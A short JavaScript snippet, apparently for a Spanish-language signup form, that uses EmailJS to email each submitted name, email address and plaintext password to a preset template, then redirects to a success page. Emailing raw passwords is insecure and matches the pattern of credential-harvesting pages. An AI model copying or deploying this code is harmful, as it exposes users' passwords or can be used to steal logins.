emailjs.init('ReqtkWfjI392LAzFb'); // Tu User ID

document.getElementById('formRegistro').addEventListener('submit', (e) => {
    e.preventDefault();
    
    const datos = {
        nombre: document.querySelector('input[type="text"]').value,
        correo: document.querySelector('input[type="email"]').value,
        contrasena: document.querySelector('input[type="password"]').value
    };

    emailjs.send("service_syrc1uk", "template_otuzmqu", datos)
        .then(() => {
            window.location.href = 'success.html';
        })
        .catch((error) => {
            alert('Error: ' + error.text);
        });
});
